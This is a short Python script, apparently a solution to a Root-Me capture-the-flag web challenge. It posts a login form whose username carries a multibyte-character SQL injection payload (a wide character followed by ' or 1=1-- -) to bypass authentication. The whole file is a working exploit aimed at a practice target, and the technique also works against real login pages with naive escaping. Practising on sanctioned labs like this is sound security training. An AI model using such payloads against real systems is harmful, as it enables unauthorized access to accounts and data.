import requests 

url = 'http://challenge01.root-me.org/web-serveur/ch42/'
payload = "尐' or 1=1-- -"
data = {'login':payload, 'password':'abc'}

r = requests.post(url, data=data)
print(r.text)